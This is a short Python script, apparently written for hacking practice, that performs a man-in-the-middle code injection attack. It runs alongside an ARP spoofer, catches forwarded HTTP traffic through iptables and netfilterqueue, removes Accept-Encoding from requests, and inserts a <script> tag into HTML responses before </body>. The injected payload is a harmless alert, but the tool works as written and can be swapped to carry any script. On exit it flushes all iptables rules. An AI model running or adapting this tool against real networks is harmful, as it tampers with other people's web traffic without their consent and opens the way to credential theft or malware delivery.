#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import subprocess
import re


def set_load(s_packet, load):
    """Modifies the load of the scapy packet passed to the load"""

    s_packet[scapy.Raw].load = load
    del s_packet[scapy.IP].len
    del s_packet[scapy.IP].chksum
    del s_packet[scapy.TCP].chksum

    return s_packet


def process_packet(packet):
    """When a packet arrives this function is called"""

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
        if scapy_packet[scapy.TCP].dport == 80:
            load = scapy_packet[scapy.Raw].load

            regex = "Accept-Encoding:.*?\\r\\n"
            new_load = re.sub(regex, "", load.decode("utf-8"))  # Not accept encoding so receive http data in plain text
            mod_packet = set_load(scapy_packet, new_load)
            packet.set_payload(bytes(mod_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response packet")
            try:
                load = scapy_packet[scapy.Raw].load.decode("utf-8")  # Errors when non ascii chars in the packets!
            except UnicodeDecodeError:
                packet.accept()
                return

            if "</body>" in load:
                new_load = load.replace("</body>", "<script>alert('Hola');</script></body>")

                mod_packet = set_load(scapy_packet, new_load)

                print("[+] MODIFIED Response packet: ")
                print(mod_packet.show())
                packet.set_payload(bytes(mod_packet))

    packet.accept()


try:
    # Execute first the arp spoofer
    # To test with this computer: iptables -I OUTPUT -j NFQUEUE --queue-num 0;
    #                             iptables -I INPUT -j NFQUEUE --queue-num 0;
    # trap the incoming packets to a queue that come from other computers while mitm:
    # iptables -I FORDWARD -j queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0;", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

    # Remember to delete iptables wih iptables --flush
except KeyboardInterrupt:
    print("closing code injector")
    subprocess.call("iptables --flush", shell=True)